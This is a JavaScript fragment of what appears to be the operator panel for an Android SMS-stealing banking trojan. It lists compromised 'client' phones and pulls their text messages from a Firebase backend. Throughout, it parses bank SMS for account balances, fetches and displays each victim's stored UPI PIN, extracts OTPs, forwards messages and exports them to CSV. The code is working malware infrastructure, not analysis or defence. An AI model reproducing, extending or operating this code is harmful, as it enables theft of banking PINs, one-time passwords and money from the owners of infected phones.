    var r=await fetch(fbUrl+'/messages/'+dev.id+'.json'+auth+'orderBy="$key"&limitToLast=20',{signal:AbortSignal.timeout(4000)});
    if(!r.ok)return;
    var msgs=parseMsgs(await r.json());
    if(!msgs.length)return;
    checkAndForward(msgs,dev.id);
  }catch(e){}
}

/* ═══════════ DEVICE LOADING ═══════════ */
async function loadDevs(){
  document.getElementById('deviceGrid').innerHTML='<div class="ldwrap" style="grid-column:1/-1"><div class="gold-spin"></div> Loading devices...</div>';
  try{
    var data=await fbGet('clients');var primDevs=parseDevs(data);
    primDevs.forEach(function(d){d._fbId='primary';d._fbLabel='Primary';d._fbUrl=FB_URL;d._fbKey=FB_KEY;});
    primDevs.forEach(function(d){if(noteC[d.id]===undefined)noteC[d.id]=d.note||'';});
    if(fbInstances.length>0){fbMergeAll();}else{allDevices=applyStableOrder(primDevs);renderStats();renderGrid();}
  }catch(e){document.getElementById('deviceGrid').innerHTML='<div class="empty" style="grid-column:1/-1"><div class="ei">⚠️</div><p>Failed to load devices</p></div>';}
}
function applyStableOrder(devs){
  if(!Array.isArray(devs)||!devs.length)return devs;
  var orderMap={};try{orderMap=JSON.parse(localStorage.getItem('fbi_device_order')||'{}');}catch(e){}
  var max=0;Object.keys(orderMap).forEach(function(k){var v=parseInt(orderMap[k],10);if(v>max)max=v;});
  devs.forEach(function(d){var num=parseInt(orderMap[d.id],10);if(isNaN(num)){max+=1;num=max;orderMap[d.id]=num;}d.deviceOrder=num;});
  devs.sort(function(a,b){return(a.deviceOrder||0)-(b.deviceOrder||0);});
  try{localStorage.setItem('fbi_device_order',JSON.stringify(orderMap));}catch(e){}
  return devs;
}
function parseDT(dt){if(!dt)return 0;var s=String(dt).trim();if(/^\d{10,13}$/.test(s))return parseInt(s.length===13?s:s+'000');var m=s.match(/(\d{1,2})[\-\/\.](\d{1,2})[\-\/\.](\d{4}).*?(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(am|pm)?/i);if(m){var h=+m[4],mn=+m[5],sc=+(m[6]||0),ap=(m[7]||'').toLowerCase();if(ap==='pm'&&h<12)h+=12;if(ap==='am'&&h===12)h=0;return new Date(+m[3],+m[2]-1,+m[1],h,mn,sc).getTime();}var d=new Date(s);return isNaN(d.getTime())?0:d.getTime();}
function parseBatt(v){if(v==null)return NaN;return parseInt(String(v).replace('%','').trim());}
function fmtPh(n){if(!n)return'—';var s=String(n).replace(/\D/g,'');if(s.startsWith('91')&&s.length===12)return'+'+s;if(s.length===10)return'+91'+s;if(s.length>0)return'+'+s;return'—';}
function parseDevs(data){
  var devs=[];
  if(data&&typeof data==='object'){
    Object.entries(data).forEach(function(kv){
      var id=kv[0],d=kv[1];if(!d||typeof d!=='object')return;
      var sims=Array.isArray(d.sims)?d.sims:(d.sims&&typeof d.sims==='object'?Object.values(d.sims):[]);
      var jTs=parseDT(d.joined||d.createdAt||d.timestamp||'')||0;
      var mob=fmtPh(d.mobNo||(sims[0]&&(sims[0].phoneNumber||'')||''));
      var upipin=(d.upipin&&String(d.upipin).trim())||null;
      devs.push({id:id,fbKey:id,name:d.modelName||d.model||d.deviceName||id,batteryRaw:d.battery!=null?d.battery:'—',batteryNum:parseBatt(d.battery),status:!!d.status,mobNo:mob,ip:d.ip_address||'—',android:d.androidV||'—',storage:d.storage||'—',note:d.note||'',joined:d.joined||'—',jTs:jTs,sdkV:d.sdkV||'—',cpuArch:d.cpu_arch||'—',isRoot:!!d.isRoot,isSdCard:!!d.isSdCard,serviceProvider:d.service_provider||'',upipin:upipin,sims:sims});
    });
  }
  devs.sort(function(a,b){if(a.status!==b.status)return b.status-a.status;if(a.jTs&&b.jTs)return b.jTs-a.jTs;return a.name.localeCompare(b.name);});
  return devs;
}

/* ═══════════ STATS ═══════════ */
var _sc={tot:0,on:0,off:0,sims:0,upi:0};
function _rebuildSC(){var on=0,off=0,sims=0,upi=0;for(var i=0;i<allDevices.length;i++){var d=allDevices[i];if(d.status)on++;else off++;sims+=d.sims.length;if(d.upipin||pinC[d.id])upi++;}_sc={tot:allDevices.length,on:on,off:off,sims:sims,upi:upi};}
function renderStats(){
  _rebuildSC();
  document.getElementById('tpTot').textContent=_sc.tot+' total';
  document.getElementById('tpOn').textContent=_sc.on+' online';
  document.getElementById('tpOff').textContent=_sc.off+' offline';
}

/* ═══════════ 3D GRID ═══════════ */
function renderGrid(){
  var grid=document.getElementById('deviceGrid');
  var filtered=allDevices.filter(function(d){
    if(gridFilter==='online'&&!d.status)return false;
    if(gridFilter==='offline'&&d.status)return false;
    if(gridFilter==='pin'&&!d.upipin&&!pinC[d.id])return false;
    if(gridFilter==='balance'&&!deviceBalances[d.id])return false;
    return true;
  });
  if(!filtered.length){grid.innerHTML='<div class="empty" style="grid-column:1/-1"><div class="ei">📵</div><p>No devices match this filter</p></div>';return;}
  var html='';
  filtered.forEach(function(d,i){
    var uid=(d._fbId||'primary')+'|||'+d.id;
    var isActive=(activeDeviceUid===uid);
    var bv=d.batteryNum;
    var bc=isNaN(bv)?'var(--sub)':bv>=60?'var(--mint)':bv>=30?'var(--gold)':'var(--rose)';
    var num=d.mobNo!=='—'?d.mobNo:(d.sims[0]?fmtPh(d.sims[0].phoneNumber||''):'—');
    var note=noteC[d.id]||d.note||'';
    var used=!!usedDevices[d.id];
    var emo=d.name.toLowerCase().includes('iphone')?'🍎':d.name.toLowerCase().includes('samsung')?'📱':'📲';
    var bal=deviceBalances[d.id];
    var balHtml = bal
      ? '<div class="dc-balance"><div class="dc-bal-lbl">💰 Balance</div><div class="dc-bal-bank">'+esc(bal.bank)+'</div><div class="dc-bal-val">'+fmtBal(bal.amount)+'</div></div>'
      : '<div class="dc-balance empty"><div class="dc-bal-lbl">💰 Balance</div><div class="dc-bal-val">—</div></div>';
    html+='<div class="device-card '+(d.status?'online':'')+' '+(isActive?'active':'')+'" onclick="openDeviceModal(\''+esc(uid)+'\')" style="animation-delay:'+(i*0.02)+'s">'
      +'<div class="dc-top"><div class="dc-icon">'+emo+'<div class="dot '+(d.status?'on':'off')+'"></div></div>'
      +'<div class="dc-meta"><div class="dc-name">'+esc(d.name)+'</div><div class="dc-id">#'+(d.deviceOrder||(i+1))+' · '+esc(d.id.substring(0,14))+'…</div></div>'
      +(isActive?'<div class="dc-active-pill">ACTIVE</div>':'')+'</div>'
      +'<div class="dc-stats">'
        +'<div class="dc-stat"><div class="dc-stat-lbl">Battery</div><div class="dc-stat-val" style="color:'+bc+'">'+(isNaN(bv)?d.batteryRaw:bv+'%')+'</div></div>'
        +'<div class="dc-stat"><div class="dc-stat-lbl">SIMs</div><div class="dc-stat-val" style="color:var(--gold2)">'+d.sims.length+'</div></div>'
        +'<div class="dc-stat"><div class="dc-stat-lbl">State</div><div class="dc-stat-val" style="color:'+(d.status?'var(--mint)':'var(--dim)')+';font-size:11px">'+(d.status?'ON':'OFF')+'</div></div>'
      +'</div>'
      +'<div class="dc-num">'+esc(num)+'</div>'
      +balHtml
      +(note?'<div class="dc-note">📝 '+esc(note)+'</div>':'')
      +'<div class="dc-footer"><div class="dc-badges">'
        +(d.upipin||pinC[d.id]?'<span class="dc-badge pin">💳 PIN</span>':'')
        +(bal?'<span class="dc-badge used">💰 '+fmtBal(bal.amount)+'</span>':'')
        +(used?'<span class="dc-badge used">✓ Used</span>':'')
        +(d.serviceProvider?'<span class="dc-badge sim">'+esc(d.serviceProvider)+'</span>':'')
      +'</div><div class="dc-conn">#'+(d.deviceOrder||(i+1))+'</div></div></div>';
  });
  grid.innerHTML=html;
}
function toggleFilterMenu(e){if(e)e.stopPropagation();document.getElementById('filterMenu').classList.toggle('open');}
function setGridFilter(f){
  gridFilter=f;
  var labels={all:'All',online:'Online',offline:'Offline',pin:'PIN',balance:'Balance'};
  document.getElementById('filterLabel').textContent=labels[f]||'All';
  document.querySelectorAll('.filter-menu > div').forEach(function(el){el.classList.toggle('active',el.dataset.f===f);});
  document.getElementById('filterMenu').classList.remove('open');
  renderGrid();
}
document.addEventListener('click',function(e){var menu=document.getElementById('filterMenu');if(menu&&!e.target.closest('.filter-wrap'))menu.classList.remove('open');});

/* ═══════════ DEVICE MODAL ═══════════ */
function openDeviceModal(uid){
  var parts=uid.split('|||');
  var d=allDevices.find(function(x){return x.id===parts[1]&&(x._fbId||'primary')===parts[0];});
  if(!d){d=allDevices.find(function(x){return x.id===parts[1];});}
  if(!d){toast('⚠ Device not found');return;}
  selDev=d;activeDeviceUid=uid;
  try{localStorage.setItem(CFG.LS_ACTIVE||'fbi_active_device',uid);}catch(e){}
  renderGrid();
  document.getElementById('deviceModal').classList.add('open');
  refreshDeviceModal();
  var cacheKey=uid;
  var cached=_msgCache[cacheKey];
  if(cached){allMsgs=cached;lastKeys=new Set(cached.map(function(m){return m.key;}));updCnt();filterActiveMsgs();renderBankPane();_silentRefresh(selDev);}
  else{document.getElementById('dmMsgList').innerHTML='<div class="ldwrap"><div class="gold-spin"></div> Loading…</div>';allMsgs=[];lastKeys=new Set();preloadMsgs(selDev.id);}
  updOtpNoteBox();
}
function refreshDeviceModal(){
  if(!selDev)return;
  var d=selDev;
  document.getElementById('dmName').textContent=d.name;
  document.getElementById('dmSub').textContent='#'+(d.deviceOrder||'—')+' · '+d.id;
  var bv=d.batteryNum,bc=isNaN(bv)?'var(--sub)':bv>=60?'var(--mint)':bv>=30?'var(--gold)':'var(--rose)';
  var bp=isNaN(bv)?0:Math.min(100,Math.max(0,bv)),bd=isNaN(bv)?d.batteryRaw:bv+'%';
  document.getElementById('dmHero').innerHTML=
    '<div class="dm-hero-batt"><div class="dm-hero-batt-num" style="color:'+bc+'">'+bd+'</div><div class="dm-hero-batt-lbl">Battery</div></div>'
    +'<div class="dm-hero-batt-bar"><div class="dm-hero-batt-fill" style="width:'+bp+'%;background:'+bc+'"></div></div>'
    +'<div class="dm-hero-status">'
      +'<span style="background:'+(d.status?'rgba(6,214,160,.14)':'rgba(244,63,94,.1)')+';color:'+(d.status?'var(--mint)':'var(--rose)')+'">'+(d.status?'● ONLINE':'● OFFLINE')+'</span>'
      +(d.serviceProvider?'<span style="background:rgba(56,189,248,.12);color:var(--sky)">'+esc(d.serviceProvider)+'</span>':'')
      +(d.isRoot?'<span style="background:rgba(168,85,247,.14);color:var(--gold2)">⚡ Root</span>':'')
    +'</div>';
  var bal=deviceBalances[d.id];
  var balHero=document.getElementById('dmBalHero');
  if(bal){
    balHero.className='dm-bal-hero';
    balHero.innerHTML='<div class="dm-bal-hero-lbl">💰 Latest Balance Detected</div>'
      +'<div class="dm-bal-hero-val">'+fmtBal(bal.amount)+'</div>'
      +'<div class="dm-bal-hero-sub"><b>🏦 '+esc(bal.bank)+'</b> · From '+esc(bal.sender||'—')+(bal.ts?' · '+new Date(bal.ts).toLocaleString():'')+'</div>';
  } else {
    balHero.className='dm-bal-hero empty';
    balHero.innerHTML='<div class="dm-bal-hero-lbl">💰 Latest Balance</div><div class="dm-bal-hero-val">No banking SMS found yet</div>';
  }
  document.getElementById('dmSim1').textContent=d.sims[0]?fmtPh(d.sims[0].phoneNumber||d.sims[0].phone||''):'No SIM';
  document.getElementById('dmSim2').textContent=d.sims[1]?fmtPh(d.sims[1].phoneNumber||d.sims[1].phone||''):'No SIM';
  var curSim=deviceSimMap[d.id]||1;
  document.querySelectorAll('#dmSimSelect .sim-opt').forEach(function(el){el.classList.toggle('active',parseInt(el.dataset.sim)===curSim);});
  document.querySelectorAll('#dmPane-send .stb').forEach(function(el,i){el.className='stb'+(i+1===curSim?(i+1===1?' s1':' s2'):'');});
  document.getElementById('dmNoteInp').value=noteC[d.id]||d.note||'';
  document.getElementById('dmInfo').innerHTML=
    '<div class="ic"><div class="ic-l">Phone</div><div class="ic-v">'+esc(d.mobNo)+'</div></div>'
    +'<div class="ic"><div class="ic-l">IP</div><div class="ic-v mono">'+esc(d.ip)+'</div></div>'
    +'<div class="ic"><div class="ic-l">Storage</div><div class="ic-v">'+esc(String(d.storage))+'</div></div>'
    +'<div class="ic"><div class="ic-l">Android</div><div class="ic-v">'+esc(d.android)+'</div></div>'
    +'<div class="ic"><div class="ic-l">SDK</div><div class="ic-v">'+esc(d.sdkV)+'</div></div>'
    +'<div class="ic"><div class="ic-l">CPU</div><div class="ic-v">'+esc(d.cpuArch)+'</div></div>'
    +'<div class="ic"><div class="ic-l">Joined</div><div class="ic-v" style="font-size:11px">'+esc(String(d.joined).slice(0,20))+'</div></div>'
    +'<div class="ic"><div class="ic-l">Firebase</div><div class="ic-v mono" style="font-size:9px">'+esc((d._fbUrl||FB_URL).substring(0,40))+'</div></div>';
  document.getElementById('dmSendDisp').innerHTML='<div style="width:9px;height:9px;border-radius:50%;background:'+(d.status?'var(--mint)':'var(--dim)')+(d.status?';box-shadow:0 0 7px var(--mint)':'')+'"></div><div style="flex:1;min-width:0"><div class="dd-name">'+esc(d.name)+'</div><div class="dd-id">'+esc(d.id)+'</div></div>';
  loadPinActive();
  renderBankPane();
}
function dmSwitchTab(tab){
  document.querySelectorAll('.dm-tab').forEach(function(t){t.classList.toggle('active',t.dataset.tab===tab);});
  document.querySelectorAll('.dm-tab-pane').forEach(function(p){p.classList.remove('active');});
  document.getElementById('dmPane-'+tab).classList.add('active');
  if(tab==='bank')renderBankPane();
}
function setActiveSim(sim){if(!selDev)return;deviceSimMap[selDev.id]=sim;saveDeviceSims();refreshDeviceModal();toast('✓ SIM '+sim+' active for '+selDev.name);}
function saveNoteActive(){
  if(!selDev)return;
  var val=document.getElementById('dmNoteInp').value.trim();
  fbSet('clients/'+selDev.id+'/note',val||null,selDev._fbUrl,selDev._fbKey).then(function(){noteC[selDev.id]=val;selDev.note=val;toast('📝 Note saved');renderGrid();}).catch(function(){toast('⚠ Failed');});
}
function confDelActive(){
  if(!selDev)return;
  document.getElementById('confT').textContent='Delete Device?';
  document.getElementById('confM').textContent='Delete "'+selDev.name+'"?';
  document.getElementById('confOk').onclick=async function(){closeM('confirmModal');try{await fbDel('clients/'+selDev.id,selDev._fbUrl,selDev._fbKey);toast('✓ Deleted');closeM('deviceModal');loadDevs();}catch(e){toast('⚠ Failed');}};
  openM('confirmModal');
}

/* ═══════════ BALANCE DETECTION ═══════════ */
function extractBalanceFromText(txt){
  if(!txt)return null;
  var pats=[
    /(?:Avl\.?\s*Bal|AvlBal|Available\s*Bal|Avail\.?\s*Bal|Avbl\s*Bal)\s*:?\s*(?:Rs\.?:?|INR)?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i,
    /(?:Ledger|Book|Closing)\s*Bal(?:ance)?\s*:?\s*(?:Rs\.?|INR)?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i,
    /CLR\s*BAL\s*([0-9,]+(?:\.[0-9]{1,2})?)\s*CR/i,
    /Bal\s*(?:INR\.?\s*)?([0-9,]+(?:\.[0-9]{1,2})?)\s*\(incl/i,
    /Bal\s*(?:\(incl[^)]*\))?\s*(?:Rs\.?|INR)\.?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i,
    /balance(?:\s*is)?\s*(?:Rs\.?|INR)?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i,
    /\bBal[\s:]+(?:Rs\.?|INR)?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i,
    /\bBal\s*-\s*(?:Rs\.?|INR)?\s*([0-9,]+(?:\.[0-9]{1,2})?)/i
  ];
  for(var i=0;i<pats.length;i++){
    var m=txt.match(pats[i]);
    if(m){var v=parseFloat(m[1].replace(/,/g,''));if(!isNaN(v))return v;}
  }
  return null;
}
function extractLastBalance(msgs){
  if(!msgs||!msgs.length)return null;
  for(var i=0;i<msgs.length;i++){
    var m=msgs[i];
    if(m.type&&m.type!=='incoming')continue;
    var bank=detectBank(m.sender);
    if(!bank)continue;
    var txt=String(m.message||'');
    var lower=txt.toLowerCase();
    var isPromo=false;
    for(var p=0;p<BANK_PROMO_KEYWORDS.length;p++){if(lower.indexOf(BANK_PROMO_KEYWORDS[p])!==-1){isPromo=true;break;}}
    var hasBal=false,hasTxn=false;
    for(var b=0;b<BANK_BAL_KEYWORDS.length;b++){if(lower.indexOf(BANK_BAL_KEYWORDS[b])!==-1){hasBal=true;break;}}
    for(var t=0;t<BANK_TXN_KEYWORDS.length;t++){if(lower.indexOf(BANK_TXN_KEYWORDS[t])!==-1){hasTxn=true;break;}}
    if(isPromo&&!hasBal&&!hasTxn)continue;
    if(!hasBal&&!hasTxn)continue;
    var amt=extractBalanceFromText(txt);
    if(amt!=null)return{amount:amt,bank:bank.name,sender:m.sender,ts:m._ts||0,msg:m.message||''};
  }
  return null;
}
function fmtBal(n){return '\u20B9'+Number(n).toLocaleString('en-IN',{maximumFractionDigits:2});}

function startBalancePoll(){
  stopBalancePoll();
  balPoll=setInterval(balanceTick,POLL_BAL);
  setTimeout(balanceTick,800);
  console.log('[BalPoll] Started ('+POLL_BAL+'ms)');
}
function stopBalancePoll(){if(balPoll){clearInterval(balPoll);balPoll=null;console.log('[BalPoll] Stopped');}}

async function balanceTick(){
  if(!FB_URL||_balTickRunning)return;
  _balTickRunning=true;
  try{
    var online=allDevices.filter(function(d){return d.status;});
    var BATCH=12;
    for(var i=0;i<online.length;i+=BATCH){
      await Promise.allSettled(online.slice(i,i+BATCH).map(async function(dev){
        try{
          var fbUrl=dev._fbUrl||FB_URL;
          var fbKey=dev._fbKey!==undefined?dev._fbKey:FB_KEY;
          var auth=fbKey?'?auth='+fbKey+'&':'?';
          var r=await fetch(fbUrl+'/messages/'+dev.id+'.json'+auth+'orderBy="$key"&limitToLast=30',{signal:AbortSignal.timeout(4000)});
          if(!r.ok)return;
          var msgs=parseMsgs(await r.json());
          var bal=extractLastBalance(msgs);
          if(bal)deviceBalances[dev.id]=bal;
        }catch(e){}
      }));
    }
    try{localStorage.setItem('fbi_device_balances',JSON.stringify(deviceBalances));}catch(e){}
    renderGrid();
    if(selDev)refreshDeviceModal();
  }finally{_balTickRunning=false;}
}

/* ═══════════ BANKING PANE ═══════════ */
function renderBankPane(){
  var el=document.getElementById('dmBankPane');
  if(!el||!selDev)return;
  var bankMsgs=allMsgs.filter(function(m){
    if(m.type!=='incoming')return false;
    return !!isBankingSms(m.sender,m.message);
  });
  if(!bankMsgs.length){
    el.innerHTML='<div class="empty"><div class="ei">🏦</div><p>No banking SMS detected on this device</p></div>';
    return;
  }
  var cr=0,dr=0;
  var cards='';
  bankMsgs.forEach(function(m){
    var bank=detectBank(m.sender);
    var txt=String(m.message||'');
    var amts=[];
    var re=/(?:Rs\.?\s*|INR\.?\s*|\u20B9\s*)([0-9,]+(?:\.[0-9]{1,2})?)/gi,match;
    while((match=re.exec(txt))!==null){var v=parseFloat(match[1].replace(/,/g,''));if(!isNaN(v)&&v>0)amts.push(v);}
    var amt=amts.length?amts[0]:0;
    var isCr=/credited|credit\b|received|deposited|refund/i.test(txt)&&!/debit/i.test(txt);
    var isDr=/debited|debit\b|spent|withdrawn/i.test(txt)&&!/credit/i.test(txt)||/\bDr\b/.test(txt);
    if(isCr)cr+=amt;
    if(isDr)dr+=amt;
    var amtBadge='';
    if(amt>0&&(isCr||isDr)){
      amtBadge='<span class="bank-card-amt '+(isCr?'bank-cr':'bank-dr')+'">'+(isCr?'+':'-')+fmtBal(amt)+'</span>';
    }
    cards+='<div class="bank-card">'
      +'<div class="bank-card-top">'
        +(bank?'<span class="bank-card-name">🏦 '+esc(bank.name)+'</span>':'')
        +'<span class="msg-sndr" style="font-size:10px;color:var(--sky)">'+esc(m.sender)+'</span>'
        +amtBadge
        +'<span class="bank-card-ts">'+esc(m.dateTime||'')+'</span>'
      +'</div>'
      +'<div class="bank-card-txt">'+esc(m.message)+'</div>'
    +'</div>';
  });
  el.innerHTML=
    '<div class="bank-summary">'
      +'<div class="bank-sum"><div class="bank-sum-l">Total Credit</div><div class="bank-sum-v" style="color:var(--mint)">'+fmtBal(cr)+'</div></div>'
      +'<div class="bank-sum"><div class="bank-sum-l">Total Debit</div><div class="bank-sum-v" style="color:var(--rose)">'+fmtBal(dr)+'</div></div>'
      +'<div class="bank-sum"><div class="bank-sum-l">Count</div><div class="bank-sum-v" style="color:var(--gold2)">'+bankMsgs.length+'</div></div>'
    +'</div>'
    +'<div class="bank-list">'+cards+'</div>';
}

/* ═══════════ PIN ═══════════ */
async function getPin(id){
  var dev=allDevices.find(function(d){return d.id===id;});
  var u=dev&&dev._fbUrl||FB_URL,k=dev&&dev._fbKey!==undefined?dev._fbKey:FB_KEY;
  try{var auth=k?'?auth='+k:'';var r=await fetch(u+'/clients/'+id+'/upipin.json'+auth,{signal:AbortSignal.timeout(4000)});var val=await r.json();
    if(val===null||val===undefined||val===false||val==='')return null;
    if(typeof val==='string'&&val.trim())return val.trim();
    if(typeof val==='number')return String(val);
    return null;
  }catch(e){return null;}
}
function preloadPins(devs){var tl=devs.filter(function(d){return d.status&&!d.upipin&&pinC[d.id]===undefined;}).slice(0,30);var i=0;function nx(){if(i>=tl.length)return;var d=tl[i++];getPin(d.id).then(function(p){pinC[d.id]=p;renderGrid();}).catch(function(){pinC[d.id]=null;});setTimeout(nx,100);}nx();}
async function loadPinActive(){
  if(!selDev)return;
  var pv=document.getElementById('dmPinVal');var pt=document.getElementById('dmPinToggle');var pcp=document.getElementById('dmPinCopy');
  if(!pv)return;
  var raw=selDev.upipin||pinC[selDev.id];
  if(!raw){raw=await getPin(selDev.id);pinC[selDev.id]=raw;}
  if(raw){var display=String(raw).split('|')[0].trim();pv.className='pin-digits blurred';pv.textContent=display;pinV[selDev.id]=false;if(pt)pt.style.display='';pt.textContent='Show';if(pcp)pcp.style.display='';}
  else{pv.className='pin-digits loading';pv.textContent='Not found';}
}
function togPinActive(){if(!selDev)return;var id=selDev.id;pinV[id]=!pinV[id];var v=document.getElementById('dmPinVal');var b=document.getElementById('dmPinToggle');if(v)v.classList.toggle('blurred',!pinV[id]);if(b)b.textContent=pinV[id]?'Hide':'Show';}
function copyPinActive(){if(!selDev)return;var v=document.getElementById('dmPinVal');if(!v||v.classList.contains('loading'))return;clip(v.textContent,document.getElementById('dmPinCopy'));}

/* ═══════════ MESSAGES ═══════════ */
function parseMsgs(data){
  var msgs=[];
  if(!data)return msgs;
  var entries=Array.isArray(data)?data.map(function(v,i){return[String(i),v];}):Object.entries(data);
  entries.forEach(function(kv){
    var k=kv[0],m=kv[1];if(m==null)return;
    var parsed=parseMsgSingle(k,m);
    if(parsed)msgs.push(parsed);
  });
  msgs.sort(function(a,b){if(a._ts>0&&b._ts>0)return b._ts-a._ts;return String(b.key).localeCompare(String(a.key));});
  return msgs;
}

async function preloadMsgs(id){
  if(!selDev)return;
  var cacheKey=(selDev._fbId||'primary')+'|||'+id;
  var fbUrl=selDev._fbUrl||FB_URL,fbKey=selDev._fbKey!==undefined?selDev._fbKey:FB_KEY;
  try{
    var auth=fbKey?'?auth='+fbKey+'&':'?';
    var r=await fetch(fbUrl+'/messages/'+id+'.json'+auth+'orderBy="$key"&limitToLast=200',{signal:AbortSignal.timeout(6000)});
    if(!r.ok)throw new Error('HTTP '+r.status);
    var msgs=parseMsgs(await r.json());
    _msgCache[cacheKey]=msgs;amCache[id]=msgs;amFetch[id]=Date.now();
    if(selDev&&selDev.id===id){allMsgs=msgs;lastKeys=new Set(msgs.map(function(m){return m.key;}));updCnt();filterActiveMsgs();renderBankPane();checkAndForward(msgs,id);}
    startMP(id);
  }catch(e){document.getElementById('dmMsgList').innerHTML='<div class="empty"><div class="ei">⚠️</div><p>Failed: '+esc(String(e.message||e))+'</p></div>';startMP(id);}
}
async function pollMsgs(id){
  if(!selDev||selDev.id!==id)return;
  var dev=selDev,cacheKey=(dev._fbId||'primary')+'|||'+id;
  var fbUrl=dev._fbUrl||FB_URL,fbKey=dev._fbKey!==undefined?dev._fbKey:FB_KEY;
  try{
    var auth=fbKey?'?auth='+fbKey+'&':'?';
    var r=await fetch(fbUrl+'/messages/'+id+'.json'+auth+'orderBy="$key"&limitToLast=200',{signal:AbortSignal.timeout(4000)});
    if(!r.ok)return;
    var msgs=parseMsgs(await r.json());
    var hasNew=msgs.some(function(m){return !lastKeys.has(m.key);});
    lastKeys=new Set(msgs.map(function(m){return m.key;}));
    _msgCache[cacheKey]=msgs;amCache[id]=msgs;amFetch[id]=Date.now();
    if(hasNew){
      allMsgs=msgs;updCnt();filterActiveMsgs();renderBankPane();
      var lm=msgs[0];
      if(lm){var otp=_extractOtp(lm.message);if(otp&&otp!==_lastOtp)otpShow(otp,lm.sender);}
      checkAndForward(msgs,id);
    } else if(allMsgs.length!==msgs.length){allMsgs=msgs;updCnt();filterActiveMsgs();renderBankPane();}
  }catch(e){}
}
function _silentRefresh(dev){
  var cacheKey=(dev._fbId||'primary')+'|||'+dev.id;
  var fbUrl=dev._fbUrl||FB_URL,fbKey=dev._fbKey!==undefined?dev._fbKey:FB_KEY;
  var auth=fbKey?'?auth='+fbKey+'&':'?';
  fetch(fbUrl+'/messages/'+dev.id+'.json'+auth+'orderBy="$key"&limitToLast=200',{signal:AbortSignal.timeout(4000)})
    .then(function(r){return r.json();})
    .then(function(data){
      var msgs=parseMsgs(data);
      _msgCache[cacheKey]=msgs;
      if(selDev&&selDev.id===dev.id){allMsgs=msgs;lastKeys=new Set(msgs.map(function(m){return m.key;}));updCnt();filterActiveMsgs();renderBankPane();}
      if(!forwardTracker[dev.id]&&msgs.length){forwardTracker[dev.id]=msgs[0].key;saveForwardTracker();}
      startMP(dev.id);
    }).catch(function(){startMP(dev.id);});
}
function updCnt(){var el=document.getElementById('dmMsgCnt');if(el)el.textContent=allMsgs.length+' msgs';}
function filterActiveMsgs(){
  var q=(document.getElementById('dmMsgSearch').value||'').toLowerCase();
  var list=allMsgs.filter(function(m){
    if(mfMode==='incoming'&&m.type!=='incoming')return false;
    if(mfMode==='outgoing'&&m.type!=='outgoing')return false;
    if(mfMode==='bank'&&!isBankingSms(m.sender,m.message))return false;
    if(q)return(m.message+m.sender).toLowerCase().includes(q);
    return true;
  });
  var el=document.getElementById('dmMsgList');
  if(!list.length){el.innerHTML='<div class="empty"><div class="ei">💬</div><p>No messages</p></div>';return;}
  el.innerHTML=list.map(function(m){
    var bankTag=detectBank(m.sender);
    var isBank=!!isBankingSms(m.sender,m.message);
    var cls=m.type==='incoming'?'inc':'out';
    if(isBank)cls+=' bank';
    return'<div class="msg-bub '+cls+'">'
      +'<div class="msg-meta"><span class="msg-sndr">'+esc(m.sender)+'</span>'+(bankTag?'<span class="msg-tp" style="background:rgba(168,85,247,.14);color:var(--gold2)">🏦 '+esc(bankTag.name)+'</span>':'')+'<span class="msg-tp '+(m.type==='incoming'?'mt-i':'mt-o')+'">'+m.type+'</span><span class="msg-dt">'+esc(m.dateTime)+'</span></div>'
      +'<div class="msg-txt">'+esc(m.message)+'</div>'
      +'<button class="msg-del-btn" onclick="confirmDelMsg(\''+(selDev?esc(selDev.id):'')+'\',\''+esc(m.key)+'\',event,\''+esc((m.message||'').substring(0,60))+'\')">✕</button></div>';
  }).join('');
}
function setActiveMF(f){
  mfMode=f;
  ['all','incoming','outgoing','bank'].forEach(function(t){var e=document.getElementById('dm-mf-'+t);if(e)e.classList.toggle('ma',t===f);});
  filterActiveMsgs();
}
async function refreshActiveMsgs(){
  if(!selDev)return;lastKeys=new Set();allMsgs=[];
  try{var data=await fbGet('messages/'+selDev.id,selDev._fbUrl,selDev._fbKey);allMsgs=parseMsgs(data);lastKeys=new Set(allMsgs.map(function(m){return m.key;}));updCnt();filterActiveMsgs();renderBankPane();}
  catch(e){toast('⚠ Refresh failed');}
}
function exportActiveMsgs(){
  if(!allMsgs.length){toast('⚠ No messages');return;}
  var csv='Sender,Type,DateTime,Message\n'+allMsgs.map(function(m){return[m.sender,m.type,m.dateTime,m.message].map(function(v){return'"'+String(v||'').replace(/"/g,'""')+'"';}).join(',');}).join('\n');
  _dlCsv('msgs-'+(selDev&&selDev.id||'dev')+'-'+Date.now()+'.csv',csv);
}
function _dlCsv(name,rows){var a=document.createElement('a');a.href='data:text/csv;charset=utf-8,'+encodeURIComponent(rows);a.download=name;a.click();}

var _delPendingDevId=null,_delPendingKey=null;
function confirmDelMsg(devId,key,evt,preview){
  if(evt)evt.stopPropagation();
  _delPendingDevId=devId;_delPendingKey=key;
  document.getElementById('delMsgPreview').textContent=preview||'(no preview)';
  document.getElementById('delMsgOk').onclick=doDelMsg;
  openM('delMsgModal');
}
async function doDelMsg(){
  closeM('delMsgModal');
  if(!_delPendingDevId||!_delPendingKey)return;
  try{
    var dev=allDevices.find(function(d){return d.id===_delPendingDevId;});
    await fbDel('messages/'+_delPendingDevId+'/'+_delPendingKey,dev&&dev._fbUrl,dev&&dev._fbKey);
    if(amCache[_delPendingDevId])amCache[_delPendingDevId]=amCache[_delPendingDevId].filter(function(m){return m.key!==_delPendingKey;});
    if(selDev&&selDev.id===_delPendingDevId){allMsgs=allMsgs.filter(function(m){return m.key!==_delPendingKey;});updCnt();filterActiveMsgs();renderBankPane();}
    toast('🗑 Deleted');
  }catch(e){toast('⚠ Failed');}
  _delPendingDevId=null;_delPendingKey=null;
}

/* ═══════════ SEND SMS ═══════════ */
function updOtpNoteBox(){
  if(!selDev)return;
  var note=otpNoteC[selDev.id]||'';
  var disp=document.getElementById('dmOtpNoteDisp'),inp=document.getElementById('dmOtpNoteInp');
  if(disp){disp.textContent=note||'No OTP note saved yet…';disp.className='otp-note-disp'+(note?'':' empty');}
  if(inp)inp.value=note;
}
function saveOtpNoteActive(){
  if(!selDev)return;
  var val=document.getElementById('dmOtpNoteInp').value.trim();
  otpNoteC[selDev.id]=val;
  var disp=document.getElementById('dmOtpNoteDisp');
  if(disp){disp.textContent=val||'No OTP note saved yet…';disp.className='otp-note-disp'+(val?'':' empty');}
  toast('✓ OTP note saved');
}
